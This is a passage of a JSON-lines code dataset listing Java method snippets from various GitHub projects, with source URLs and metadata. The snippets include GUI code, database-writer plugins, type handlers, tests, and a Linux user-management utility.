LIST_COMMAND_OPTION_SHORT:\n                this.savedOption = ListCommandOptions.SHORT;\n                return true;\n\n            case LIST_COMMAND_OPTION_LONG:\n                this.savedOption = ListCommandOptions.LONG;\n                return true;\n\n            default:\n                return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/ListCmd.java", "stars": "6", "class_props": {"extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"id": 30408, "method_name": "store16", "class_name": "ROM", "params": ["int", "short"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void store16(int address, short value) {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/ROM.java", "stars": "4", "class_props": {"extends": "Memory", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30409, "method_name": "store8", "class_name": "ROM", "params": ["int", "byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void store8(int address, byte value) {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/ROM.java", "stars": "4", "class_props": {"extends": "Memory", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30410, "method_name": "init", "class_name": "GuiClick", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        GL11.glColor4f(1, 1, 1, 1);\n       // posX = 4;\n       // posY = 100;\n       // width = 400;\n        //height = 250;\n        //lastPosX = 2;\n        //lastPosY = 2;\n        panels.add(currentPanel = new MainPanel());\n        panels.add(new ModulesPanel());\n        panels.add(new FriendsPanel());\n        panels.add(new ConfigPanel());\n        panels.add(new SettingsPanel());\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 30411, "method_name": "drawScreen", "class_name": "GuiClick", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawScreen(int mouseX, int mouseY, float partialTicks) {\n        super.drawScreen(mouseX, mouseY, partialTicks);\n        /*if (dragging) {\n            this.posX = mouseX + this.lastPosX;\n            this.posY = mouseY + this.lastPosY;\n        }*/\n        /*RenderUtil.drawBorderedRect(posX, posY, posX + width, posY + height, 2, new Color(25,25,25).getRGB(), new Color(17,15,16,150).getRGB());\n        Gui.drawRect(posX + 2, posY + 2, posX + width - 2, posY + height - 2, new Color(25,25,25).getRGB());\n        RenderUtil.drawRoundedRect(posX + 40, posY + 25, posX + width - 100, posY + 35, 1, new Color(36, 36, 36).getRGB());\n        Gui.drawRect(posX + 2, posY + 40, posX + width - 2, posY + height - 2, new Color(29,29,29).getRGB());\n\n        currentPanel.draw(posX + 2, posY + 40, posX + width - 2, posY + height - 2);*/\n        ScaledResolution res = new ScaledResolution(mc);\n        int x = 0;\n        for (Panel panel : panels) {\n            float renderX = (res.getScaledWidth() / 2) + x - (panels.size() * 20);\n            if (panel == currentPanel) {\n                RenderUtil.drawBorderedRect(renderX - 2f, 2, renderX + font.getStringWidth(panel.getLabel()) + 1f, font.getHeight() + 3f, 1, new Color(0, 0, 0, 255).getRGB(), new Color(0, 0, 0, 137).getRGB());\n            }\n            font.drawStringWithShadow(panel.getLabel(), renderX, 3, -1);\n            x += font.getStringWidth(panel.getLabel()) + 10;\n        }\n        currentPanel.draw(mouseX, mouseY, partialTicks);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 30412, "method_name": "mouseClicked", "class_name": "GuiClick", "params": ["int", "int", "int"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked(int mouseX, int mouseY, int mouseButton) throws IOException {\n        super.mouseClicked(mouseX, mouseY, mouseButton);\n        ScaledResolution res = new ScaledResolution(mc);\n        int x = 0;\n        for (Panel panel : panels) {\n            float renderX = (res.getScaledWidth() / 2) + x - (panels.size() * 20);\n            if (MouseUtil.withinBounds(mouseX, mouseY, renderX - 2f, 2, renderX + font.getStringWidth(panel.getLabel()) + 1f, font.getHeight() + 3f)) {\n                currentPanel = panel;\n            }\n            x += font.getStringWidth(panel.getLabel()) + 10;\n        }\n        /*if (MouseUtil.withinBounds(mouseX, mouseY, posX, posY, posX + width, posY + 20)) {\n            if (mouseButton == 0) {\n                dragging = true;\n                this.lastPosX = (posX - mouseX);\n                this.lastPosY = (posY - mouseY);\n            }\n        }*/\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 30413, "method_name": "mouseReleased", "class_name": "GuiClick", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseReleased(int mouseX, int mouseY, int mouseButton) {\n        super.mouseReleased(mouseX, mouseY, mouseButton);\n        /*if (mouseButton == 0) {\n            dragging = false;\n        }*/\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 30414, "method_name": "keyTyped", "class_name": "GuiClick", "params": ["char", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyTyped(char typedChar, int key) {\n        if (key == Keyboard.KEY_ESCAPE) {\n            Minecraft.getMinecraft().player.closeScreen();\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 30415, "method_name": "doesGuiPauseGame", "class_name": "GuiClick", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean doesGuiPauseGame()\n    {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 30416, "method_name": "preCheck", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void preCheck() {\n            this.init();\n            this.commonRdbmsWriterJob.writerPreCheck(this.originalConfig, DATABASE_TYPE);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30417, "method_name": "init", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void init() {\n            this.originalConfig = super.getPluginJobConf();\n            this.commonRdbmsWriterJob = new CommonRdbmsWriter.Job(DATABASE_TYPE);\n            this.commonRdbmsWriterJob.init(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30418, "method_name": "prepare", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void prepare() {\n            //\u5b9e\u8dd1\u5148\u4e0d\u652f\u6301 \u6743\u9650 \u68c0\u9a8c\n            //this.commonRdbmsWriterJob.privilegeValid(this.originalConfig, DATABASE_TYPE);\n            this.commonRdbmsWriterJob.prepare(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30419, "method_name": "split", "class_name": "Job", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "List<Configuration>", "snippet": "        public List<Configuration> split(int mandatoryNumber) {\n            return this.commonRdbmsWriterJob.split(this.originalConfig, mandatoryNumber);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30420, "method_name": "post", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void post() {\n            this.commonRdbmsWriterJob.post(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30421, "method_name": "destroy", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void destroy() {\n            this.commonRdbmsWriterJob.destroy(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30422, "method_name": "init", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void init() {\n            this.writerSliceConfig = super.getPluginJobConf();\n            this.commonRdbmsWriterTask = new CommonRdbmsWriter.Task(DATABASE_TYPE);\n            this.commonRdbmsWriterTask.init(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30423, "method_name": "prepare", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void prepare() {\n            this.commonRdbmsWriterTask.prepare(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30424, "method_name": "startWrite", "class_name": "Task", "params": ["RecordReceiver"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void startWrite(RecordReceiver recordReceiver) {\n            this.commonRdbmsWriterTask.startWrite(recordReceiver, this.writerSliceConfig,\n                    super.getTaskPluginCollector());\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30425, "method_name": "post", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void post() {\n            this.commonRdbmsWriterTask.post(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30426, "method_name": "destroy", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void destroy() {\n            this.commonRdbmsWriterTask.destroy(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30427, "method_name": "supportFailOver", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean supportFailOver() {\n            String writeMode = writerSliceConfig.getString(Key.WRITE_MODE);\n            return \"replace\".equalsIgnoreCase(writeMode);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30428, "method_name": "show", "class_name": "PythonVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void show() {\n        System.out.println(\"\u8fd9\u662fPython\u8bfe\u7a0b\u7684\u89c6\u9891\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/PythonVideo.java", "stars": "2", "class_props": {"extends": "Video", "implements": null, "modifiers": ["public"]}}, {"id": 30429, "method_name": "select", "class_name": "RoundRobinLoadBalancer", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T extends Instance> T select(T[] instances) {\n        int length = instances.length;\n        if (length == 0) {\n            throw new IllegalArgumentException();\n        }\n        return instances[counter.getAndIncrement() % length];\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/lb/RoundRobinLoadBalancer.java", "stars": "3", "class_props": {"extends": null, "implements": ["LoadBalancer"], "modifiers": ["public"]}}, {"id": 30430, "method_name": "main", "class_name": "Demo01List", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa\u4e00\u4e2aList\u96c6\u5408,\u5b58\u50a8\u59d3\u540d\n        List<String> list = new ArrayList<>();\n        list.add(\"\u5f20\u65e0\u5fcc\");\n        list.add(\"\u5468\u82b7\u82e5\");\n        list.add(\"\u8d75\u654f\");\n        list.add(\"\u5f20\u5f3a\");\n        list.add(\"\u5f20\u4e09\u4e30\");\n\n        //\u5bf9list\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u8fc7\u6ee4,\u53ea\u8981\u4ee5\u5f20\u5f00\u5934\u7684\u5143\u7d20,\u5b58\u50a8\u5230\u4e00\u4e2a\u65b0\u7684\u96c6\u5408\u4e2d\n        List<String> listA = new ArrayList<>();\n        for(String s : list){\n            if(s.startsWith(\"\u5f20\")){\n                listA.add(s);\n            }\n        }\n\n        //\u5bf9listA\u96c6\u5408\u8fdb\u884c\u8fc7\u6ee4,\u53ea\u8981\u59d3\u540d\u957f\u5ea6\u4e3a3\u7684\u4eba,\u5b58\u50a8\u5230\u4e00\u4e2a\u65b0\u96c6\u5408\u4e2d\n        List<String> listB = new ArrayList<>();\n        for (String s : listA) {\n            if(s.length()==3){\n                listB.add(s);\n            }\n        }\n\n        //\u904d\u5386listB\u96c6\u5408\n        for (String s : listB) {\n            System.out.println(s);\n        }\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo01/Stream/Demo01List.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30431, "method_name": "testAllExistSucess", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAllExistSucess() {\n    String[] keys = {\"a\", \"b\", \"c\", \"d\"};\n    ValidationUtils.validateAllOrNone(PROPS, keys);\n    ValidationUtils.validateAllNotEmpty(PROPS, keys);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30432, "method_name": "testAllExistFail", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAllExistFail() {\n    ValidationUtils.validateAllNotEmpty(PROPS, \"x\", \"y\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30433, "method_name": "testAllExistFail2", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAllExistFail2() {\n    ValidationUtils.validateAllNotEmpty(PROPS, \"a\", \"y\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30434, "method_name": "testNoneExistSuccess", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testNoneExistSuccess() {\n    ValidationUtils.validateAllOrNone(PROPS, \"z\");\n    ValidationUtils.validateAllOrNone(PROPS, \"e\", \"f\", \"g\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30435, "method_name": "setNonNullParameter", "class_name": "LocalDateTypeHandler", "params": ["PreparedStatement", "int", "LocalDate", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, LocalDate parameter, JdbcType jdbcType)\n          throws SQLException {\n    ps.setObject(i, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 30436, "method_name": "getNullableResult", "class_name": "LocalDateTypeHandler", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalDate", "snippet": "  public LocalDate getNullableResult(ResultSet rs, String columnName) throws SQLException {\n    return rs.getObject(columnName, LocalDate.class);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 30437, "method_name": "getNullableResult", "class_name": "LocalDateTypeHandler", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalDate", "snippet": "  public LocalDate getNullableResult(ResultSet rs, int columnIndex) throws SQLException {\n    return rs.getObject(columnIndex, LocalDate.class);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 30438, "method_name": "getNullableResult", "class_name": "LocalDateTypeHandler", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalDate", "snippet": "  public LocalDate getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {\n    return cs.getObject(columnIndex, LocalDate.class);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 30439, "method_name": "initComponents", "class_name": "RMT", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initComponents() {\n\n        jLabel2 = new javax.swing.JLabel();\n        jButton3 = new javax.swing.JButton();\n        jButton4 = new javax.swing.JButton();\n        jLabel1 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jLabel2.setFont(new java.awt.Font(\"Tahoma\", 0, 18)); // NOI18N\n        jLabel2.setText(\"READ - ME TRANSFER\");\n\n        jButton3.setText(\"Chat Box\");\n        jButton3.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton3ActionPerformed(evt);\n            }\n        });\n\n        jButton4.setText(\"File Transfer\");\n        jButton4.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton4ActionPerformed(evt);\n            }\n        });\n\n        jLabel1.setText(\"Select option to continue\");\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 178, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n            .addGroup(layout.createSequentialGroup()\n                .addGap(141, 141, 141)\n                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 130, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(141, Short.MAX_VALUE))\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addComponent(jButton3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                    .addComponent(jButton4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n                .addGap(152, 152, 152))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addContainerGap(39, Short.MAX_VALUE)\n                .addComponent(jLabel2)\n                .addGap(56, 56, 56)\n                .addComponent(jLabel1)\n                .addGap(28, 28, 28)\n                .addComponent(jButton3)\n                .addGap(18, 18, 18)\n                .addComponent(jButton4)\n                .addGap(77, 77, 77))\n        );\n\n        pack();\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 30440, "method_name": "jButton3ActionPerformed", "class_name": "RMT", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed\n        //Main m = new Main();\n        ChatBox c = new ChatBox();\n        c.frame();\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 30441, "method_name": "jButton4ActionPerformed", "class_name": "RMT", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton4ActionPerformed\n        // TODO add your handling code here:\n        LoginFrame lf = new LoginFrame();\n        lf.frame();\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 30442, "method_name": "main", "class_name": "RMT", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new RMT().setVisible(true);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 30443, "method_name": "getInstance", "class_name": "UserManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "UserManager", "snippet": "    public static UserManager getInstance() {\n        if (mInstance == null) {\n            mInstance = new UserManager();\n        }\n        return mInstance;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/manager/UserManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30444, "method_name": "getUserManagerApi", "class_name": "UserManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UserManagerApi", "snippet": "    public UserManagerApi getUserManagerApi () {\n        return mRetrofit.create(UserManagerApi.class);\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/manager/UserManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30445, "method_name": "existUser", "class_name": "LinuxPlatFormUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Triple<Boolean,Integer,Integer>", "snippet": "    public static Triple<Boolean, Integer, Integer> existUser(String username){\n        String linuxIdCommand = \"id ${userName}\";\n        RunShell runShell = new RunShell(PatternInjectUtils.inject(linuxIdCommand,\n                new String[]{username}));\n        if(runShell.run() == 0){\n            String result = runShell.getResult();\n            String uid = null, gid = null;\n            Matcher matcher = LINUX_USER_INFO_PATTERN.matcher(result);\n            while(matcher.find()){\n                String name = matcher.group(1);\n                if(\"uid\".equalsIgnoreCase(name)){\n                    uid = matcher.group(2);\n                }else if(\"gid\".equalsIgnoreCase(name)){\n                    gid = matcher.group(2);\n                }\n            }\n            if(StringUtils.isNotBlank(uid) && StringUtils.isNotBlank(gid)){\n                return new MutableTriple<>(true, Integer.valueOf(uid), Integer.valueOf(gid));\n            }\n        }\n        return new MutableTriple<>(false, null, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30446, "method_name": "createUser", "class_name": "LinuxPlatFormUtil", "params": ["String", "Integer", "Integer"], "throws": null, "modifiers": ["public", "static"], "return_type": "Pair<Boolean,String>", "snippet": "    public static Pair<Boolean, String> createUser(String username, Integer uid, Integer gid){\n        String linuxUserAddCommand = \"sudo useradd ${userName}\";\n        List<String> params = new ArrayList<>();\n        params.add(username);\n        if(Optional.ofNullable(uid).filter(e -> e > 0).isPresent()){\n            linuxUserAddCommand += \" -u ${uid}\";\n            params.add(String.valueOf(uid));\n        }\n        if(Optional.ofNullable(gid).filter(e -> e > 0).isPresent()){\n            linuxUserAddCommand += \" -g ${gid}\";\n            params.add(String.valueOf(gid));\n        }\n        String[] paramArray = new String[params.size()];\n        params.toArray(paramArray);\n        RunShell runShell = new RunShell(PatternInjectUtils.inject(linuxUserAddCommand, paramArray));\n        return runShell.run() == 0? new MutablePair<>(true, null) : new MutablePair<>(false, runShell.getResult());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30447, "method_name": "currentUser", "class_name": "LinuxPlatFormUtil", "params": [], "throws": null, "modifiers": 